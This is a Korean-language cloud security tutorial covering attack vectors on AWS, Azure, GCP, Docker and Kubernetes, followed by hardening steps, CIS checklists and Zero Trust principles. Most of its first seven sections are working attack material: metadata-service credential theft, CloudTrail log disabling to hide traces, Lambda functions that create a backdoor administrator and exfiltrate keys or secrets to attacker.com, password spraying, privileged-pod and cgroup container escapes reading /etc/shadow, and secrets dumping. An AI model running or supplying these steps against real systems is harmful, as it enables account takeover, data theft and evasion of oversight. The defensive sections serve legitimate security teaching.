# 클라우드 공격 벡터 완전 분석

## 클라우드 위협 모델

```
클라우드 공격 표면
───────────────────────────────────────────
  외부 공격자          내부자          공급망
      │                  │               │
  잘못된 설정         과도한 권한      취약한 의존성
  노출된 API         자격증명 도용    악성 이미지
  취약한 앱          데이터 무단접근  CI/CD 공격
      └──────────────────┴───────────────┘
                         │
                   클라우드 자산
              (S3/Storage/인스턴스/DB)
───────────────────────────────────────────
```

---

## 1. AWS 주요 공격 벡터

### IAM 권한 남용

```
IAM 공격 체인:
  공개 EC2 접근
      │
  임시 자격증명 획득 (메타데이터 서비스)
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
      │
  IAM 역할 권한 확인
  aws iam list-attached-role-policies --role-name ROLE_NAME
      │
  권한 상승 기회 탐색
  aws iam simulate-principal-policy
      │
  관리자 권한 획득
  → 전체 AWS 계정 탈취
```

```bash
# IMDS(인스턴스 메타데이터 서비스) 악용
# EC2 내부에서 임시 자격증명 획득
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → 역할 이름 반환

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
# → AccessKeyId, SecretAccessKey, Token 반환

# 탈취한 자격증명으로 AWS CLI 사용
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity  # 현재 권한 확인
aws iam list-users           # 사용자 목록
aws s3 ls                    # S3 버킷 목록
```

### S3 버킷 오설정

```bash
# 공개 버킷 탐지
aws s3api list-buckets --query 'Buckets[].Name'

# 버킷 공개 접근 확인
aws s3api get-bucket-acl --bucket TARGET_BUCKET
aws s3api get-bucket-policy --bucket TARGET_BUCKET

# 공개 버킷 내용 나열 (인증 없이)
aws s3 ls s3://TARGET_BUCKET --no-sign-request

# 파일 다운로드
aws s3 cp s3://TARGET_BUCKET/sensitive.txt . --no-sign-request

# S3 버킷 브루트포스
# 버킷 이름: company-name, company-backup, company-dev, company-staging...
for suffix in "" "-backup" "-dev" "-staging" "-prod" "-data" "-logs"; do
    aws s3 ls "s3://target-company${suffix}" --no-sign-request 2>/dev/null && \
    echo "[+] 공개 버킷 발견: target-company${suffix}"
done
```

### CloudTrail 로그 비활성화 (흔적 제거)

```bash
# CloudTrail 현황 확인
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name mytrail

# 로깅 중지 (공격자 행위)
aws cloudtrail stop-logging --name mytrail

# 이벤트 선택기 수정으로 특정 API 제외
aws cloudtrail put-event-selectors --trail-name mytrail \
    --event-selectors '[{"ReadWriteType":"None"}]'
```

### Lambda 함수 공격

```python
# 악성 Lambda 함수 (권한 상승)
import boto3
import os

def lambda_handler(event, context):
    # Lambda 실행 역할의 권한으로 실행
    iam = boto3.client('iam')
    
    # 새 관리자 사용자 생성
    iam.create_user(UserName='backdoor_admin')
    iam.attach_user_policy(
        UserName='backdoor_admin',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    # 접근 키 생성
    keys = iam.create_access_key(UserName='backdoor_admin')
    
    # 외부로 전송
    import urllib.request
    urllib.request.urlopen(
        f"http://attacker.com/exfil?key={keys['AccessKey']['AccessKeyId']}&secret={keys['AccessKey']['SecretAccessKey']}"
    )
    
    return {"statusCode": 200}
```

---

## 2. Azure 공격 벡터

### Azure AD 공격

```bash
# AzureAD 정찰 (ROADtools)
pip install roadrecon
roadrecon gather -u user@company.com -p password
roadrecon gui

# 게스트 계정으로 탐색
az login --tenant TENANT_ID
az ad user list --query "[].{UPN:userPrincipalName,Id:id}"
az ad group list --query "[].{Name:displayName}"
az ad sp list --query "[].{Name:displayName,AppId:appId}"

# 관리 단위 탐색
az rest --method GET \
    --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits"

# 조건부 접근 정책 우회 (레거시 인증)
# 조건부 접근이 Modern Auth만 차단할 때
# IMAP/POP3/SMTP (레거시)로 인증 시도
python3 o365spray.py --enum --userfile users.txt --domain company.com
python3 o365spray.py --spray -p "Spring2024!" --userfile valid_users.txt
```

### Azure SSRF via IMDS

```bash
# Azure VM에서 메타데이터 접근
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 관리 ID 토큰 획득
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"

# 획득한 토큰으로 Azure API 사용
TOKEN=$(curl -H "Metadata: true" "http://169.254.169.254/..." | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

---

## 3. GCP 공격 벡터

```bash
# GCP 메타데이터 서비스
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"

# 서비스 계정 키 탐색
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account=SA_EMAIL

# 스토리지 버킷 공개 접근
gsutil ls gs://TARGET_BUCKET
gsutil cat gs://TARGET_BUCKET/sensitive_file.txt

# GCP 권한 열거
gcloud projects get-iam-policy PROJECT_ID
gcloud iam roles list
gcloud iam service-accounts get-iam-policy SA_EMAIL
```

---

## 4. 컨테이너/Kubernetes 공격

### Docker 취약점

```bash
# Docker 소켓 노출 탐지 및 악용
# 취약: docker.sock이 컨테이너에 마운트된 경우
ls -la /var/run/docker.sock

# 컨테이너 이스케이프 (privileged 컨테이너)
# 호스트 파일시스템 마운트
docker run --privileged -v /:/host alpine chroot /host /bin/bash

# 호스트 네트워크 접근
docker run --net=host alpine

# 위험한 실행 명령
docker run --cap-add=SYS_ADMIN --security-opt seccomp=unconfined ...
```

### Kubernetes 공격

```bash
# API 서버 공개 접근 탐지
kubectl --server=https://TARGET_K8S:6443 get pods --all-namespaces \
    --insecure-skip-tls-verify

# 익명 접근 가능 여부 확인
curl -k https://TARGET_K8S:6443/api/v1/namespaces
curl -k https://TARGET_K8S:6443/api/v1/secrets

# ServiceAccount 토큰 활용
# 파드 내부에서:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://kubernetes.default.svc/api/v1/namespaces \
    -H "Authorization: Bearer $TOKEN"

# RBAC 권한 확인
kubectl auth can-i --list
kubectl auth can-i get secrets -n kube-system

# 권한 상승 (create pods 권한 있을 때)
# 호스트 마운트가 있는 특권 파드 생성
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
spec:
  containers:
  - name: privesc
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-volume
  volumes:
  - name: host-volume
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF

# etcd 직접 접근 (API 서버 우회)
etcdctl --endpoints=https://ETCD_IP:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    get / --prefix --keys-only | grep secrets
```

### 컨테이너 이스케이프 기법

```bash
# 기법 1: /proc/sched_debug 정보 유출
cat /proc/sched_debug | grep -i "host"

# 기법 2: cgroups notify_on_release
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# 기법 3: CVE-2019-5736 (runc 취약점)
# runc 버전 < 1.0-rc6에서 호스트 runc 덮어쓰기 가능
```

---

## 5. 서버리스 공격

```python
# Lambda 환경변수 탈취
import os
import urllib.request

def lambda_handler(event, context):
    # 환경변수에 저장된 시크릿 탈취
    secrets = {k: v for k, v in os.environ.items() 
               if any(x in k.upper() for x in 
                      ['SECRET', 'KEY', 'TOKEN', 'PASSWORD', 'DB_'])}
    
    # 외부 전송
    data = str(secrets).encode()
    req = urllib.request.Request(
        "http://attacker.com/exfil",
        data=data,
        method="POST"
    )
    urllib.request.urlopen(req, timeout=5)
    
    return {"statusCode": 200}
```

---

## 6. 클라우드 측면 이동 (Lateral Movement)

```bash
# AWS: 역할 전환 (AssumeRole)
aws sts assume-role \
    --role-arn "arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole" \
    --role-session-name "attacker"

# 전환된 역할로 다른 계정 접근
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls  # 다른 AWS 계정에서 실행

# VPC 피어링을 통한 내부 이동
aws ec2 describe-vpc-peering-connections
aws ec2 describe-route-tables

# Transit Gateway를 통한 이동
aws ec2 describe-transit-gateways
```

---

## 7. 클라우드 데이터 유출 기법

```bash
# S3 버킷 전체 다운로드
aws s3 sync s3://target-bucket . --no-sign-request

# RDS 스냅샷 공유
aws rds describe-db-snapshots --owner-id ACCOUNT_ID
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier snap-xxx \
    --attribute-name restore \
    --values-to-add "all"  # 공개로 변경

# CloudFormation 템플릿 (시크릿 포함)
aws cloudformation get-template --stack-name STACK_NAME

# AWS Secrets Manager 덤프
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# Parameter Store 덤프
aws ssm get-parameters-by-path --path "/" --recursive \
    --with-decryption
```

---

## 8. 방어: 클라우드 보안 강화

```bash
# AWS Security Hub 활성화
aws securityhub enable-security-hub
aws securityhub enable-standards \
    --standards-subscription-requests "StandardsArn=arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.2.0"

# GuardDuty 활성화
aws guardduty create-detector --enable

# S3 블록 공개 접근
aws s3api put-public-access-block \
    --bucket TARGET_BUCKET \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# IMDSv2 강제 (SSRF 방어)
aws ec2 modify-instance-metadata-options \
    --instance-id INSTANCE_ID \
    --http-tokens required \
    --http-endpoint enabled

# CloudTrail 모든 리전 활성화
aws cloudtrail create-trail \
    --name all-region-trail \
    --s3-bucket-name my-cloudtrail-bucket \
    --is-multi-region-trail

# IAM 접근 분석기 활성화
aws accessanalyzer create-analyzer \
    --analyzer-name MyAnalyzer \
    --type ACCOUNT
```

### CIS AWS Foundations 주요 점검 사항

```
IAM:
  □ 루트 계정 MFA 활성화
  □ IAM 비밀번호 정책 강화
  □ 90일 이상 미사용 접근 키 비활성화
  □ 접근 키 주기적 교체 (90일)
  □ CloudTrail에 IAM 정책 변경 알림

스토리지:
  □ S3 공개 접근 차단
  □ S3 버킷 로깅 활성화
  □ S3 서버 측 암호화 (SSE-S3 또는 SSE-KMS)
  □ 중요 버킷 MFA Delete 활성화

네트워크:
  □ VPC 기본 보안 그룹 모든 트래픽 차단
  □ VPC 플로우 로그 활성화
  □ 0.0.0.0/0에 SSH(22) 개방 금지
  □ 0.0.0.0/0에 RDP(3389) 개방 금지

모니터링:
  □ CloudTrail 모든 리전 활성화
  □ CloudTrail 로그 무결성 검증 활성화
  □ GuardDuty 활성화
  □ Security Hub 활성화
  □ Config Rules 설정
```

---

## 9. 클라우드 보안 위협 현황 (2020년대)

### 주요 클라우드 보안 위협 트렌드

```
클라우드 침해 사고 주요 원인 (비율 순):
  1. 잘못된 설정 (Misconfiguration) ─────── 68%
     - 공개 S3 버킷
     - 과도한 IAM 권한
     - 보안 그룹 과다 개방
  
  2. 취약한 자격증명 관리 ────────────────── 19%
     - 하드코딩된 API 키
     - 미사용 접근 키 미삭제
     - MFA 미적용
  
  3. 내부자 위협 ─────────────────────────── 8%
     - 과도한 권한 남용
     - 데이터 무단 유출
  
  4. 취약한 인터페이스/API ───────────────── 5%
     - 인증 없는 API 엔드포인트
     - 취약한 인증 메커니즘
```

### 클라우드 공유 책임 모델
```
             사용자 책임    │    클라우드 제공자 책임
─────────────────────────────────────────────────────
IaaS:    데이터, OS, 앱     │    물리, 네트워크, 하이퍼바이저
PaaS:    데이터, 앱         │    물리~런타임
SaaS:    데이터, 설정       │    물리~앱
─────────────────────────────────────────────────────
공통:    계정 관리, MFA, 암호화 키 관리, 데이터 분류
```

### 클라우드 보안 도구 및 프레임워크
```bash
# ScoutSuite — 다중 클라우드 보안 감사
pip install scoutsuite
scout aws
scout azure --tenant TENANT_ID
scout gcp --project PROJECT_ID

# Prowler — AWS 보안 감사
pip install prowler
prowler aws                          # 전체 점검
prowler aws --checks s3_bucket_public  # 특정 점검

# Pacu — AWS 레드팀 프레임워크
git clone https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py
# pacu> import_keys PROFILE_NAME
# pacu> run iam__enum_users_roles_policies_groups
```

---

## 10. Zero Trust 보안 모델

### Zero Trust 핵심 원칙

```
기존 경계 보안:                    Zero Trust:
  외부 = 신뢰 안함                  모든 것 = 신뢰 안함
  내부 = 신뢰함              →      항상 검증
  경계 방화벽 중심                   최소 권한 원칙
                                    지속적 모니터링
```

### Zero Trust 5대 기둥 (NIST SP 800-207 기반)
```
1. ID 및 접근 관리 (Identity)
   - 강력한 MFA 강제
   - 지속적 사용자 검증
   - 조건부 접근 정책

2. 디바이스 보안 (Device)
   - 디바이스 건강 상태 검증
   - 인증된 디바이스만 접근
   - MDM/EDR 필수

3. 네트워크 (Network)
   - 마이크로세그멘테이션
   - 암호화된 통신 (TLS 1.3)
   - 네트워크 트래픽 검사

4. 애플리케이션 워크로드 (Application)
   - API 보안
   - 앱별 접근 제어
   - 런타임 보호

5. 데이터 (Data)
   - 데이터 분류 및 레이블
   - 데이터 암호화 (저장/전송)
   - DLP(데이터 유출 방지)
```

### Zero Trust 구현 단계
```
단계 1: 가시성 확보
  - 모든 자산 식별 및 인벤토리
  - 트래픽 흐름 파악
  - 데이터 분류

단계 2: 마이크로세그멘테이션
  - 레거시 VLAN → 세밀한 정책 기반 분리
  - 동서 트래픽 통제

단계 3: 최소 권한 적용
  - Just-in-Time (JIT) 접근
  - Just-Enough-Access (JEA)
  - 특권 계정 격리 (PAM)

단계 4: 지속적 검증 및 모니터링
  - SIEM/SOAR 통합
  - UEBA (사용자/엔티티 행동 분석)
  - 자동 대응
```
